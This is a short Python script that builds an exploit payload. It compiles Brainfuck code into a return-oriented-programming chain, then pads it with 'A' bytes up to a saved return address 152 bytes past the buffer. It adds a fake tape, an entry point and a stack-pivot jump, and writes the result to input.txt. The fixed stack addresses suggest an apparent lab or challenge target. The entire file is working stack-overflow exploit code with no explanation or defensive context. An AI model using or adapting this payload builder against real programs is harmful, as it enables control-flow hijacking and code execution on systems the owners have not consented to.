from mimetypes import init
from bf_parser.bf_parser import *

# calculate offsets and constants

ra_offset = 152
payload_max_size = 1000000
tape_size = 30000

initial_sp = 0x3ffffff000
tape_start = initial_sp - tape_size
rop_chain_start = initial_sp - payload_max_size

# parse the brainfuck code

bf_code = input("Paste the Brainfuck code to compile:\n")

p = BF_Parser(bf_code)

rop_chain = p.parse(tape_start + tape_size // 2, rop_chain_start)
entry_point = p.get_entry_point()

offset = b"A" * (payload_max_size - tape_size - len(rop_chain) + ra_offset)
tape = b"\x00" * tape_size

current_sp = 0x3ffffff010
jump_to_rop = p.jump_to_rop(rop_chain_start, initial_sp + 16)

payload = rop_chain + offset + tape + entry_point + jump_to_rop

print(f"The payload has {len(payload)} bytes and can be found in the input.txt file")
print(f"The rop_chain itself has {len(rop_chain)} bytes")

with open("input.txt", "wb") as fout:
    fout.write(payload)